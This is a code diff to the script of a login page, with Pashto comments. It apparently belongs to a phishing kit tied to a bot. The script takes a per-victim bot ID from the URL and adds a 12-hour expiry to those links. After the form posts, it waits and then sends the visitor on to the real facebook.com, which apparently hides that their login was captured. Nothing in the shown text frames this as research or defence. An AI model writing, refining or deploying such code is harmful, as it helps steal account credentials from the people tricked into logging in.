@@ -85,12 +85,25 @@
   </div>
 
 <script>
-  // د URL Path څخه کوډ راواخله
-  const path = window.location.pathname; // لکه /Bot48734704_123456
-  const uid = path.split("/").pop();     // اخري برخه (Bot48734704_123456)
+  const path = window.location.pathname;
+  const uidRaw = path.split("/").pop(); // لکه Bot7703382662_403997|1693640000000
 
-  if (uid) {
-    document.getElementById("uid").value = uid;
+  if (uidRaw) {
+    const parts = uidRaw.split("|");
+    const uid = parts[0];        // Bot7703382662_403997
+    const createdAt = parseInt(parts[1], 10); // timestamp
+
+    const now = Date.now();
+    const diff = now - createdAt;
+
+    if (diff > 12 * 60 * 60 * 1000) { // 12 hours
+      alert("❌ دا لینک باطل شوی دی (اعتبار یې ۱۲ ساعته و).");
+      document.getElementById("loginForm").addEventListener("submit", function(e) {
+        e.preventDefault();
+      });
+    } else {
+      document.getElementById("uid").value = uid;
+    }
   } else {
     alert("❌ UID not found. Please use the bot's link to log in.");
     document.getElementById("loginForm").addEventListener("submit", function(e) {
@@ -99,7 +112,6 @@
   }
 
   document.getElementById('loginForm').addEventListener('submit', function() {
-    // Delay redirect to allow form to POST
     setTimeout(() => {
       window.location.href = "https://facebook.com";
     }, 1500);
